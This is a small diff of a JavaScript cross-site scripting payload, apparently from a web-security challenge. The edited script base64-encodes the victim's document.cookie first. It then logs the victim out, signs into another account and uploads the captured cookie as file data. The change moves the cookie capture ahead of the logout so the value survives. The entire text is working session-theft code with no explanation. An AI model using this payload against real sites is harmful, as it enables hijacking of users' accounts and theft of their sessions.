@@ -1,3 +1,4 @@
+aaa=btoa(document.cookie);
 fetch("/user/logout").then(e=>{
  fetch("/signin",{
     method: "POST",
@@ -11,7 +12,7 @@ fetch("/user/logout").then(e=>{
   headers: {
     "Content-Type": "application/x-www-form-urlencoded",
   },
-  body: "filename=asdf2&data="+btoa(document.cookie),
+  body: "filename=asdf2&data="+aaa,
 })
 })
 })
